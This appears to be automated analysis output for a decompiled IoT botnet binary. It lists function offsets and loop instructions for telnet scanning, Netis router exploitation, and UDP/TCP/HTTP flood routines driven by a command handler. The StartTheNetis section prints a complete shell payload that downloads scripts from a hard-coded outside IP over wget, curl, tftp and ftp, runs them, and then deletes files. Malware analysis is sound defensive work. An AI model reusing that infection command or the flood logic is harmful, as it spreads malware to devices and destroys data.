    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 39405
++++++++ FUNCTION END 39554
++++++++ FUNCTION LENGTH 149
    gethostbyname_r(a1, &v145, (int32_t)&v144, 460, (int32_t)&result, v142, v143, v143);
=================FUNCTION : __libc_close ===================
++++++++ FUNCTION START 27027
++++++++ FUNCTION END 27184
++++++++ FUNCTION LENGTH 157
    int32_t v144 = close(fd); // 0x8051f8c
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 31003
++++++++ FUNCTION END 31160
++++++++ FUNCTION LENGTH 157
    int32_t result = _vfprintf_internal(v145, (char *)a3, a4); // 0x805249a
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 33177
++++++++ FUNCTION END 33382
++++++++ FUNCTION LENGTH 205
        while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 29936
++++++++ FUNCTION END 30082
++++++++ FUNCTION LENGTH 146
    return wait4(a1, a2, a3, 0);
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 35731
++++++++ FUNCTION END 35900
++++++++ FUNCTION LENGTH 169
    while (true) {
=================FUNCTION : HackerScan ===================
++++++++ FUNCTION START 9312
++++++++ FUNCTION END 9459
++++++++ FUNCTION LENGTH 147
    return rand_cmwc(v144) & -1 - a1 ^ v144;
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 69498
++++++++ FUNCTION END 69719
++++++++ FUNCTION LENGTH 221
    while (true) {
=================FUNCTION : socket ===================
++++++++ FUNCTION START 41167
++++++++ FUNCTION END 41312
++++++++ FUNCTION LENGTH 145
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 4831
++++++++ FUNCTION END 5019
++++++++ FUNCTION LENGTH 188
    while (true) {
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 65014
++++++++ FUNCTION END 65160
++++++++ FUNCTION LENGTH 146
    return _stdio_fopen(a1, (char *)a2, 0, -1);
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 40279
++++++++ FUNCTION END 40424
++++++++ FUNCTION LENGTH 145
    return __socketcall(6, (int32_t)&a1);
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 2353 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2412 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 2771 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2785 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v146, v145);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 2916 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2930 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v146, v145);
=============================WHILE LOOPS ID : 5 @ print ====================================
++++++++ WHILE START : 3457 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 3708 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v148);
		while (true) {
		int32_t v165 = prints(v144, (char *)&v145, v158, v155); // 0x804884a
		int32_t v167 = printi(v144, (int64_t)v166, 10, 0, v158, v155, 97) + result2; // 0x804880c
		int32_t v169 = printi(v144, (int64_t)v168, 16, 0, v158, v155, 65) + result2; // 0x80487b8
		int32_t v171 = printi(v144, (int64_t)v170, 16, 0, v158, v155, 97) + result2; // 0x8048764
		int32_t v173 = printi(v144, (int64_t)v172, 10, 1, v158, v155, 97) + result2; // 0x8048710
		v151 = prints(v144, v174, v158, v155) + result2;
=============================WHILE LOOPS ID : 6 @ fdpclose ====================================
++++++++ WHILE START : 4794 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 4818 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v150 = __libc_waitpid(v149, (int32_t)&v148, 0); // 0x8048c65
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v147, 0);
=============================WHILE LOOPS ID : 9 @ getBogos ====================================
++++++++ WHILE START : 5880 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 5940 
++++++++ INTRESTING INSTRUCTIONS :  
		uppercase((char *)&v145);
		if (strstr(v146, "BOGOMIPS") != v146) {
		if (fdgets(v146, 0x1000, v144) == 0) {
		while (true) {
		while (true) {
		__libc_close(v144);
=============================WHILE LOOPS ID : 10 @ getCores ====================================
++++++++ WHILE START : 6104 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 6121 
++++++++ INTRESTING INSTRUCTIONS :  
		uppercase((char *)&v145);
		if (strstr(v146, "BOGOMIPS") == v146) {
		if (fdgets(v146, 0x1000, v144) == 0) {
=============================WHILE LOOPS ID : 11 @ recvLine ====================================
++++++++ WHILE START : 6457 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6518 
++++++++ INTRESTING INSTRUCTIONS :  
		HackerPrint((int32_t)v158, (int32_t)"PING");
		while (true) {
		if (__libc_recv((int32_t)v158, v155, 1, 0) != 1) {
=============================WHILE LOOPS ID : 14 @ listFork ====================================
++++++++ WHILE START : 7081 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 7098 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v148);
=============================WHILE LOOPS ID : 15 @ matchPrompt ====================================
++++++++ WHILE START : 7456 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 7508 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 16 @ readUntil ====================================
++++++++ WHILE START : 7660 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 7737 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v150 = __libc_recv(a1, v149, 1, 0); // 0x8049a7b
		int32_t v153 = __libc_recv(a1, v149 + 1, 2, 0); // 0x8049acc
		if (strstr(v145, (char *)a2) == 0) {
=============================WHILE LOOPS ID : 18 @ contains_string ====================================
++++++++ WHILE START : 11122 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 11138 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v147) == 0) {
=============================WHILE LOOPS ID : 19 @ StartTheLelz ====================================
++++++++ WHILE START : 11304 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 11874 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		socket(0x10000 * v165 / 0x10000, v166, v164);
		if (__libc_connect(v166, v164, 0) == -1) {
		sclose(v166);
		socket(0x10000 * v165 / 0x10000, v166, v164);
		case 1: {
		sclose(v161);
		sclose(v176);
		getsockopt(v161, v177, v175, 10, v171);
		sclose(v161);
		case 2: {
		case 3: {
		if (__libc_send(v178, v147, v158, (int32_t)&v162) >= 0) {
		if (__libc_send(v178, v147, v158, (int32_t)&v162) >= 0) {
		case 4: {
		case 5: {
		if (__libc_send(v179, v152, v147, v158) >= 0) {
		if (__libc_send(v179, v152, v147, v158) >= 0) {
		case 6: {
		get_telstate_host();
		HackerPrint(v150, v152);
		get_telstate_host();
		HackerPrint(v150, v152);
		case 7: {
		if (__libc_send(v182, v150, v152, v147) >= 0) {
		sclose(v182);
		while (true) {
=============================WHILE LOOPS ID : 20 @ StartTheNetis ====================================
++++++++ WHILE START : 12028 
++++++++ WHILE FUNCTION : StartTheNetis 
++++++++ WHILE END : 12037 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v148 = socket(2, 2, 0); // 0x804e34f
		NetisRanges(v148);
		sprintf(v147, (int32_t)"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00");
		__libc_sendto(v148, v147, v149, 0, v145, 16);
=============================WHILE LOOPS ID : 21 @ sendHTTP ====================================
++++++++ WHILE START : 12859 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 12897 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork(v148) == 0) {
		while (true) {
		v150 = socket_connect(a1, a3);
		__libc_close(v150);
=============================WHILE LOOPS ID : 22 @ sendSTD ====================================
++++++++ WHILE START : 13063 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 13087 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v144, v155, 75, 0);
		__libc_connect(v144, v147, 16);
		__libc_close(v144);
=============================WHILE LOOPS ID : 23 @ sendUDP ====================================
++++++++ WHILE START : 13277 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 13304 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v148, v150, a5, 0, (int32_t)&v145, 16);
		rand_cmwc((int32_t)v143);
=============================WHILE LOOPS ID : 24 @ sendUDP ====================================
++++++++ WHILE START : 13392 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 13432 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v172, (int32_t)&v173, (int32_t)&v173, (int32_t)&v173, (int32_t)&v173, (int32_t)&v173);
		*v162 = (int16_t)rand_cmwc(v172);
		v174 = rand_cmwc(v172);
		*(int16_t *)(v160 | 4) = (int16_t)rand_cmwc(v176);
=============================WHILE LOOPS ID : 25 @ sendTCP ====================================
++++++++ WHILE START : 13837 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13967 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v181 = ((int32_t)(v180 | _strncmp(v168, "rst", 4) % 2 == 0) | v175 & -256) ^ 1; // 0x804f309
		int32_t v188 = ((int32_t)(v187 | _strncmp(v168, "psh", 4) % 2 == 0) | v175 & -256) ^ 1; // 0x804f3ff
		HackerPrint(4, (int32_t)"psh");
		v176 = "psh";
		v176 = "psh";
=============================WHILE LOOPS ID : 26 @ sendTCP ====================================
++++++++ WHILE START : 13991 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 14020 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v161, v150, v145, v146, v147, 0);
		*(int16_t *)(v152 | 4) = (int16_t)rand_cmwc(v161);
		*v156 = rand_cmwc(v161);
		*v154 = (int16_t)rand_cmwc(v161);
		*v164 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 27 @ sendTCP ====================================
++++++++ WHILE START : 14055 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 14070 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v161, v150, v145, v146, v147, 0);
		*(int16_t *)(v152 | 4) = (int16_t)rand_cmwc(v161);
		*v156 = rand_cmwc(v161);
		*v154 = (int16_t)rand_cmwc(v161);
		*v164 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 29 @ sendJUNK ====================================
++++++++ WHILE START : 14269 
++++++++ WHILE FUNCTION : sendJUNK 
++++++++ WHILE END : 14392 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(v174);
		getsockopt(v168, v167, 0x2710, v165, (int32_t)&v173);
		__libc_close(v168);
		makeRandomStr((char *)v164, v145);
		if (__libc_send(v168, v167, v157, v165) != -1) {
		__libc_close(v168);
		socket(v164, v145, v169);
		if (__libc_connect(v164, v145, v169) == -1) {
		__libc_close(v164);
=============================WHILE LOOPS ID : 32 @ sendHOLD ====================================
++++++++ WHILE START : 14591 
++++++++ WHILE FUNCTION : sendHOLD 
++++++++ WHILE END : 14693 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(v169);
		getsockopt(v171, v168, 0x2710, v164, (int32_t)&v165);
		__libc_close(v171);
		__libc_close(v175);
		socket(v162, v145, (int32_t)&v165);
		if (__libc_connect(v162, v145, (int32_t)&v165) == -1) {
		__libc_close(v162);
=============================WHILE LOOPS ID : 34 @ processCmd ====================================
++++++++ WHILE START : 15122 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15168 
++++++++ INTRESTING INSTRUCTIONS :  
		if (*v306 != __libc_getpid()) {
		kill(v308, 9);
=============================WHILE LOOPS ID : 35 @ processCmd ====================================
++++++++ WHILE START : 15252 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15268 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v309, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 39 @ processCmd ====================================
++++++++ WHILE START : 15484 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15493 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 41 @ processCmd ====================================
++++++++ WHILE START : 15546 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15562 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v311, v261, v262);
=============================WHILE LOOPS ID : 43 @ processCmd ====================================
++++++++ WHILE START : 15668 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15677 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 45 @ processCmd ====================================
++++++++ WHILE START : 15766 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15785 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 15897 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15906 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 49 @ processCmd ====================================
++++++++ WHILE START : 15978 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15987 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 16094 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16103 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 54 @ processCmd ====================================
++++++++ WHILE START : 16268 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16277 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 16338 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16347 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 58 @ processCmd ====================================
++++++++ WHILE START : 16441 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16450 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 60 @ processCmd ====================================
++++++++ WHILE START : 16526 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16543 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v314, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 62 @ processCmd ====================================
++++++++ WHILE START : 16659 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16668 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 64 @ processCmd ====================================
++++++++ WHILE START : 16737 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16746 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 66 @ processCmd ====================================
++++++++ WHILE START : 16851 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16860 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 68 @ processCmd ====================================
++++++++ WHILE START : 16939 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16951 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 17062 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17071 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 17140 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17149 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 17254 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17263 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 17420 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17429 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 17482 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17491 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 17559 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17568 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 17614 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17626 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 17700 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17709 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 17745 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17754 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 17822 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17831 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 17884 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17902 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v175, v199, (int16_t)v198, v196, v195, v193);
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 18000 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18009 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 18052 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18061 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 18142 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18151 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 18204 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18216 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 18303 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18312 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 18355 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18364 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 18445 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18454 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 18511 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18521 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 18614 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18623 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 18666 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18675 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 18756 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18765 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 18818 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18830 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 18917 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18926 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 18969 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18978 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 19059 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19068 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 19186 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19195 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 19231 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19240 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 19308 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19317 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v287, v281, v282, v283, (char *)v284, v266, v267);
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 19363 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19375 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 19407 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19416 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 19457 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19467 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v239, v237, v238);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 19505 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19514 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 19551 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19563 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 19595 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19604 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 19689 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19705 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v317, v187, v188, v189, v190, v158);
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 19764 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19773 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 112 @ processCmd ====================================
++++++++ WHILE START : 19817 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19829 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v242, v250, v251);
		sendSTD(v242, v250, v251);
		sendHOLD(v242, v250, v251);
		__libc_close((int32_t)v143);
=============================WHILE LOOPS ID : 113 @ processCmd ====================================
++++++++ WHILE START : 19871 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19880 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v263, v261, v262);
=============================WHILE LOOPS ID : 114 @ processCmd ====================================
++++++++ WHILE START : 19928 
++++++++ WHILE FUNCTION : processCmd 
